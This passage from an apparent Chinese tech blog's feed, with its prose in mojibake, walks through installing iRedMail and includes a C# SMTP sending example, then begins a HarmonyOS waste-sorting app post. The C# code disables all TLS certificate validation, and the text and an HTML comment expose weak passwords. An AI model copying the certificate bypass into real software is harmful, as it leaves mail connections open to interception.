ä¸Šè®¾ç½®é‚®ä»¶æœåŠ¡å™¨</h1><p>è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»å…¶ Github å­˜å‚¨åº“ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ iRedMail è„šæœ¬å®‰è£…ç¨‹åºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/iredmail/iRedMail/archive/1.6.4.tar.gz</span><br></pre></td></tr></table></figure><p>æå–å­˜æ¡£æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvf 1.6.4.tar.gz</span><br></pre></td></tr></table></figure><p>ç„¶å cd è¿›å…¥æ–°åˆ›å»ºçš„ç›®å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> iRedMail-1.6.4/</span><br></pre></td></tr></table></figure><p>ä¸ºiRedMail.shè„šæœ¬æ·»åŠ å¯æ‰§è¡Œæƒé™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x iRedMail.sh</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ sudo æƒé™è¿è¡Œ Bash è„šæœ¬ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash iRedMail.sh</span><br></pre></td></tr></table></figure><p>å°†å‡ºç°é‚®ä»¶æœåŠ¡å™¨<strong>è®¾ç½®å‘å¯¼</strong>ã€‚ä½¿ç”¨ Tab é”®é€‰æ‹© <strong>YES</strong>ï¼Œç„¶åæŒ‰ Enterã€‚<br>Welcome and thanks for your use</p><p>ä¸‹ä¸€ä¸ªå±å¹•å°†è¦æ±‚é€‰æ‹©é‚®ä»¶å­˜å‚¨è·¯å¾„ã€‚å¯ä»¥ä½¿ç”¨é»˜è®¤çš„ &#x2F;var&#x2F;vmailï¼Œåªéœ€æŒ‰ Enter é”®å³å¯ã€‚<br>sub-directory:&#x2F;var&#x2F;vmail&#x2F;backup </p><p>ç„¶åé€‰æ‹©æ˜¯å¦è¦è¿è¡Œ Web æœåŠ¡å™¨ã€‚å¼ºçƒˆå»ºè®®é€‰æ‹©è¿è¡Œ Web æœåŠ¡å™¨ï¼Œå› ä¸ºéœ€è¦åŸºäº Web çš„ç®¡ç†é¢æ¿æ¥æ·»åŠ ç”µå­é‚®ä»¶å¸æˆ·ã€‚<br>å®ƒè¿˜å…è®¸è®¿é—® Roundcube ç½‘ç»œé‚®ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé€‰æ‹© <strong>Nginx</strong> Web æœåŠ¡å™¨ï¼Œå› æ­¤åªéœ€æŒ‰ Enter é”®å³å¯ã€‚ ï¼ˆæ˜Ÿå·è¡¨ç¤ºè¯¥é¡¹ç›®å·²è¢«é€‰ä¸­ã€‚ï¼‰<br>Nginx The fastest web server</p><p>ç„¶åé€‰æ‹©ç”µå­é‚®ä»¶å¸æˆ·çš„å­˜å‚¨åç«¯ã€‚é€‰æ‹©ç†Ÿæ‚‰çš„ä¸€ä¸ªã€‚é€‰æ‹©<strong>MariaDB</strong>ã€‚æŒ‰ä¸Šä¸‹æ–¹å‘é”®å¹¶æŒ‰ç©ºæ ¼é”®è¿›è¡Œé€‰æ‹©ã€‚<br>select item.</p><p>å¦‚æœé€‰æ‹©äº† MariaDB æˆ– MySQLï¼Œé‚£ä¹ˆå°†éœ€è¦è®¾ç½® MySQL root å¯†ç ã€‚ 123123.z<br>root on server</p><p>æ¥ä¸‹æ¥ï¼Œè¾“å…¥ç¬¬ä¸€ä¸ªé‚®ä»¶åŸŸã€‚å¯ä»¥ç¨ååœ¨åŸºäº Web çš„ç®¡ç†é¢æ¿ä¸­æ·»åŠ å…¶ä»–é‚®ä»¶åŸŸã€‚æœ¬æ•™ç¨‹å‡è®¾éœ€è¦ä¸€ä¸ªç”µå­é‚®ä»¶å¸æˆ·ï¼Œä¾‹å¦‚[å—ä¿æŠ¤çš„ç”µå­é‚®ä»¶]ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦åœ¨æ­¤å¤„è¾“å…¥ your-domain.comï¼Œä¸å¸¦å­åŸŸã€‚ä¸è¦åœ¨åŸŸååé¢æŒ‰ç©ºæ ¼é”®ã€‚è®¤ä¸º iRedMail ä¼šå°†ç©ºæ ¼å­—ç¬¦ä¸åŸŸåä¸€èµ·å¤åˆ¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰è£…å¤±è´¥ã€‚<br>Postfix wonâ€™t accept anyemail sent to this mail domain.</p><p>æ¥ä¸‹æ¥ï¼Œè®¾ç½®é‚®ä»¶åŸŸç®¡ç†å‘˜çš„å¯†ç ã€‚<br>iRedAdmin with this account.</p><p>é€‰æ‹©å¯é€‰ç»„ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé€‰æ‹© 4 ä¸ªé¡¹ç›®ã€‚å¦‚æœå–œæ¬¢ SOGo ç»„ä»¶ï¼Œè¯·é€‰æ‹©å®ƒå¹¶æŒ‰ Enterã€‚</p><p>Review your settings<br>ç°åœ¨å¯ä»¥æ£€æŸ¥é…ç½®ã€‚è¾“å…¥ Y å¼€å§‹å®‰è£…æ‰€æœ‰é‚®ä»¶æœåŠ¡å™¨ç»„ä»¶ã€‚</p><p>å®‰è£…ç»“æŸæ—¶ï¼Œé€‰æ‹©Y ä½¿ç”¨iRedMailæä¾›çš„é˜²ç«å¢™è§„åˆ™å¹¶é‡æ–°å¯åŠ¨é˜²ç«å¢™ã€‚ Y</p><p>è‡³æ­¤iRedMailå®‰è£…å®Œæˆã€‚å°†æ”¶åˆ°ç½‘ç»œé‚®ä»¶ã€SOGo ç»„ä»¶å’Œç½‘ç»œç®¡ç†é¢æ¿çš„ URL ä»¥åŠç™»å½•å‡­æ®çš„é€šçŸ¥ã€‚ iRedMail.tips æ–‡ä»¶åŒ…å«æœ‰å…³ iRedMail æœåŠ¡å™¨çš„é‡è¦ä¿¡æ¯ã€‚<br>URLs of installed web applications:</p><h1 id="reboot-é‡å¯"><a href="#reboot-é‡å¯" class="headerlink" title="reboot é‡å¯"></a>reboot é‡å¯</h1><p><a class="link"   href="https://mail.your-domain.com/iredadmin/" >https://mail.your-domain.com/iredadmin/<i class="fas fa-external-link-alt"></i></a> è®¿é—®ç®¡ç†é¢æ¿<br>ç™»å½•å æœ€åè¾¹æ·»åŠ -&gt;ç”¨æˆ· è¾“å…¥ä¿¡æ¯å³å¯æ·»åŠ ç”¨æˆ·</p><p><a class="link"   href="https://mail.your-domain.com/" >https://mail.your-domain.com/<i class="fas fa-external-link-alt"></i></a>  ç”¨æˆ·ç™»å½•é¢æ¿</p><h1 id="ä»£ç è°ƒç”¨smtpå‘é€ç¤ºä¾‹"><a href="#ä»£ç è°ƒç”¨smtpå‘é€ç¤ºä¾‹" class="headerlink" title="ä»£ç è°ƒç”¨smtpå‘é€ç¤ºä¾‹"></a>ä»£ç è°ƒç”¨smtpå‘é€ç¤ºä¾‹</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Net.Mail;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"><span class="keyword">using</span> System.Net.Security;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApp1Mail</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> smtpServer = <span class="string">&quot;mail.myimmail.workxx&quot;</span>;</span><br><span class="line">            <span class="built_in">int</span> smtpPort = <span class="number">587</span>;</span><br><span class="line">            <span class="built_in">string</span> smtpUser = <span class="string">&quot;postmaster@myimmail.workxx&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> smtpPassword = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> recipientEmail = <span class="string">&quot;reemail&quot;</span>;</span><br><span class="line">            <span class="comment">// å¿½ç•¥è¯ä¹¦éªŒè¯</span></span><br><span class="line">            ServicePointManager.ServerCertificateValidationCallback = <span class="built_in">delegate</span> (</span><br><span class="line">                <span class="built_in">object</span> sender,</span><br><span class="line">                X509Certificate certificate,</span><br><span class="line">                X509Chain chain,</span><br><span class="line">                SslPolicyErrors sslPolicyErrors)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// å¿½ç•¥æ‰€æœ‰è¯ä¹¦é”™è¯¯</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            SendVerificationEmail(smtpServer, smtpPort, smtpUser, smtpPassword, recipientEmail);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendVerificationEmail</span>(<span class="params"><span class="built_in">string</span> smtpServer, <span class="built_in">int</span> smtpPort, <span class="built_in">string</span> smtpUser, <span class="built_in">string</span> smtpPassword, <span class="built_in">string</span> recipientEmail</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> subject = <span class="string">&quot;Email Verification&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> body = <span class="string">&quot;This is your verification code: 123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (SmtpClient client = <span class="keyword">new</span> SmtpClient(smtpServer, smtpPort))</span><br><span class="line">                &#123;</span><br><span class="line">                    client.Credentials = <span class="keyword">new</span> NetworkCredential(smtpUser, smtpPassword);</span><br><span class="line">                    client.EnableSsl = <span class="literal">true</span>; <span class="comment">// å¯ç”¨ SSL</span></span><br><span class="line"></span><br><span class="line">                    MailMessage message = <span class="keyword">new</span> MailMessage</span><br><span class="line">                    &#123;</span><br><span class="line">                        From = <span class="keyword">new</span> MailAddress(smtpUser),</span><br><span class="line">                        Subject = subject,</span><br><span class="line">                        Body = body</span><br><span class="line">                    &#125;;</span><br><span class="line">                    message.To.Add(recipientEmail);</span><br><span class="line"></span><br><span class="line">                    client.Send(message);</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;Email sent successfully!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…å®Œiredéœ€è¦é‡å¯"><a href="#å®‰è£…å®Œiredéœ€è¦é‡å¯" class="headerlink" title="å®‰è£…å®Œiredéœ€è¦é‡å¯~"></a>å®‰è£…å®Œiredéœ€è¦é‡å¯~</h2><!--éœ€è¦åœ¨æ­¤å¤„è¾“å…¥ your-domain.comï¼Œä¸å¸¦å­åŸŸã€‚ä¸è¦åœ¨åŸŸååé¢æŒ‰ç©ºæ ¼é”®ã€‚æˆ‘è®¤ä¸º iRedMail ä¼šå°†ç©ºæ ¼å­—ç¬¦ä¸åŸŸåä¸€èµ·å¤åˆ¶ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰è£…å¤±è´¥ã€‚ mail.xxx.com 123123.zxc å®‰è£…iredmail éœ€dialogapt-get updateapt-get install -y dialoghttps://github.com/iredmail/iRedMail/archive/refs/tags/1.7.1.tar.gzhttps://github.com/iredmail/iRedMail/archive/refs/tags/1.7.0.tar.gzmail.imsmail.work.gdsudo hostnamectl set-hostname  mail.myimmail.work.gdsudo hostnamectl set-hostname mail.imsmail.work.gdecho "127.0.0.1 mail.imsmail.work.gd mail localhost" | sudo tee -a /etc/hosts25,80,443,587,993  iRedMailhttps://www.iredmail.org/download.htmlwget https://codeload.github.com/iredmail/iRedMail/tar.gz/refs/tags/1.7.1è¿‡ç¨‹ä¸­ 123123.zxcmyimmail.work.gd123123.zxcMariaDBhttps://cn.linux-terminal.com/?p=3276 -->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;iRedMail&quot;&gt;&lt;a href=&quot;#iRedMail&quot; class=&quot;headerlink&quot; title=&quot;iRedMail&quot;&gt;&lt;/a&gt;iRedMail&lt;/h1&gt;&lt;p&gt;iRedMail æ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œå¯ä»¥åœ¨ Linux&amp;#x2F;BSD æœåŠ¡å™¨ä¸Šè‡ª</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="iRedMail" scheme="https://banjinmei.github.io/tags/iRedMail/"/>
    
    <category term="smtp" scheme="https://banjinmei.github.io/tags/smtp/"/>
    
  </entry>
  
  <entry>
    <title>HarmonryOS Next Waste Sorting</title>
    <link href="https://banjinmei.github.io/2024/12/15/HarmonryOS-Next-waste-sorting/"/>
    <id>https://banjinmei.github.io/2024/12/15/HarmonryOS-Next-waste-sorting/</id>
    <published>2024-12-15T07:33:54.000Z</published>
    <updated>2024-12-15T08:58:35.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>DevEco Studio NEXT Beta1 Build Version: 5.0<br>API 13</p><h1 id="Waste-Sorting"><a href="#Waste-Sorting" class="headerlink" title="Waste Sorting"></a>Waste Sorting</h1><p>åƒåœ¾åˆ†ç±» </p><h2 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//springCurveå›å¼¹</span></span><br><span class="line"><span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">    <span class="attr">duration</span>:<span class="number">800</span>,</span><br><span class="line">    <span class="attr">curve</span>: curves.<span class="title function_">springCurve</span>(<span class="number">0</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">20</span>),</span><br><span class="line">    <span class="comment">// å…¶ä»–é…ç½®</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>åˆå§‹åç§»é‡ã€æŒ¯å¹…ã€å‘¨æœŸå’Œé˜»å°¼ç³»æ•°ï¼Œé€šè¿‡è¿™äº›å‚æ•°å¯ä»¥æ§åˆ¶åŠ¨ç”»çš„å¼¹æ€§æ•ˆæœ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Fisher-Yatesæ´—ç‰Œ</span></span><br><span class="line"><span class="title function_">shuffleItems</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">garbageItems</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">let</span> temp = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i] = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; curves &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// å¯¼å…¥ArkUIå·¥å…·åŒ…ä¸­çš„æ›²çº¿æ¨¡å—</span></span><br><span class="line"><span class="comment">// å®šä¹‰åƒåœ¾é¡¹ç›®ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GarbageItem</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string; <span class="comment">// åƒåœ¾åç§°</span></span><br><span class="line">  <span class="attr">type</span>: number; <span class="comment">// åƒåœ¾ç±»å‹</span></span><br><span class="line">  description?: string; <span class="comment">// åƒåœ¾æè¿°ï¼Œå¯é€‰</span></span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–åƒåœ¾é¡¹ç›®</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: string, type: number, description?: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name; <span class="comment">// è®¾ç½®åƒåœ¾åç§°</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span> = type; <span class="comment">// è®¾ç½®åƒåœ¾ç±»å‹</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = description || <span class="string">&quot;&quot;</span>; <span class="comment">// è®¾ç½®åƒåœ¾æè¿°ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å®šä¹‰åƒåœ¾ç±»åˆ«ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GarbageCategory</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string; <span class="comment">// ç±»åˆ«åç§°</span></span><br><span class="line">  <span class="attr">type</span>: number; <span class="comment">// ç±»åˆ«ç±»å‹</span></span><br><span class="line">  <span class="attr">color</span>: string; <span class="comment">// ç±»åˆ«é¢œè‰²</span></span><br><span class="line">  <span class="attr">description</span>: string; <span class="comment">// ç±»åˆ«æè¿°</span></span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–åƒåœ¾ç±»åˆ«</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: string, type: number, color: string, description: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name; <span class="comment">// è®¾ç½®ç±»åˆ«åç§°</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span> = type; <span class="comment">// è®¾ç½®ç±»åˆ«ç±»å‹</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color; <span class="comment">// è®¾ç½®ç±»åˆ«é¢œè‰²</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = description; <span class="comment">// è®¾ç½®ç±»åˆ«æè¿°</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä½¿ç”¨ç»„ä»¶è£…é¥°å™¨å®šä¹‰ä¸€ä¸ªåä¸ºIndexçš„åº”ç”¨å…¥å£</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">  <span class="comment">// å®šä¹‰çŠ¶æ€å˜é‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentQuestionIndex</span>: number = <span class="number">0</span>; <span class="comment">// å½“å‰é¢˜ç›®ç´¢å¼•</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">quizResults</span>: string[] = []; <span class="comment">// æµ‹éªŒç»“æœæ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">totalScore</span>: number = <span class="number">0</span>; <span class="comment">// æ€»å¾—åˆ†</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">showAnimation</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ˜¯å¦æ˜¾ç¤ºåŠ¨ç”»</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">scaleOptions</span>: <span class="title class_">ScaleOptions</span> = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;; <span class="comment">// ç¼©æ”¾é€‰é¡¹</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">itemXPosition</span>: number = <span class="number">0</span>; <span class="comment">// ç‰©å“Xè½´ä½ç½®</span></span><br><span class="line">  @<span class="title class_">State</span> <span 